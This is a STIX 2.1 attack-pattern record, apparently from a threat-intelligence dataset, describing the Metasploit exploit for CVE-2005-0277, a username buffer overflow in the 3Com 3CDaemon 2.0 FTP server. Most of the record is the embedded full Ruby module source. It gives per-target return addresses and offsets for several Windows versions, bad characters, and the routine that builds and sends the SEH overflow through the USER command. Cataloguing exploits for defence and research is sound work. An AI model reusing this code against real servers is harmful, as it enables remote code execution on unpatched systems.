{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c531b319-c99f-42dd-a978-dfef80f27cfc",
    "created": "2024-08-14T16:50:55.675328Z",
    "modified": "2024-08-14T16:50:55.675332Z",
    "name": "3Com 3CDaemon 2.0 FTP Username Overflow",
    "description": " This module exploits a vulnerability in the 3Com 3CDaemon FTP service. This package is being distributed from the 3Com web site and is recommended in numerous support documents. This module uses the USER command to trigger the overflow. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/3cdaemon_ftp_user.rb",
            "external_id": "3cdaemon_ftp_user.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0277"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => '3Com 3CDaemon 2.0 FTP Username Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the 3Com 3CDaemon\n        FTP service. This package is being distributed from the 3Com\n        web site and is recommended in numerous support documents.\n        This module uses the USER command to trigger the overflow.\n      },\n      'Author'         =>\n        [\n          'hdm',       # Original author\n          'otr'        # Windows XP SP3\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0277'],\n          [ 'OSVDB', '12810'],\n          [ 'OSVDB', '12811'],\n          [ 'BID', '12155']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'target' => 0\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 674,\n          'BadChars' => \"\\x00~+&=%\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\\x09\",\n          'StackAdjustment' => -3500,\n          'Compat'   =>\n            {\n              'ConnectionType' => \"-find\"\n            }\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 English', # Tested OK - hdm 11/24/2005\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x75022ac4, # ws2help.dll\n              'Offset'   => 229,\n            },\n          ],\n          [\n            'Windows XP English SP0/SP1',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x71aa32ad, # ws2help.dll\n              'Offset'   => 229,\n            },\n          ],\n          [\n            'Windows NT 4.0 SP4/SP5/SP6',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x77681799, # ws2help.dll\n              'Offset'   => 229,\n            },\n          ],\n          [\n            'Windows 2000 Pro SP4 French',\n            {\n              'Platform' => 'win',\n              'Ret' => 0x775F29D0,\n              'Offset'   => 229,\n            },\n          ],\n          [\n            'Windows XP English SP3',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x7CBD41FB,   # 7CBD41FB JMP ESP shell32.data SP3\n              #'Ret'      => 0x775C2C1F,   # 775C2C1F JMP ESP shell32.data SP1\n              'Offset'   => 245,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-01-04'))\n  end\n\n  def check\n    connect\n    disconnect\n    if (banner =~ /3Com 3CDaemon FTP Server Version 2\\.0/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    if (target == targets[4])\n      buf = rand_text_english(target['Offset'], payload_badchars)\n      buf << [ target['Ret'] ].pack('V') * 2\n      buf << payload.encoded\n    else\n      buf = rand_text_english(2048, payload_badchars)\n      seh = generate_seh_payload(target.ret)\n      buf[target['Offset'], seh.length] = seh\n    end\n\n    send_cmd( ['USER', buf] , false )\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-01-04",
    "x_mitre_platforms": [
        "win'"
    ]
}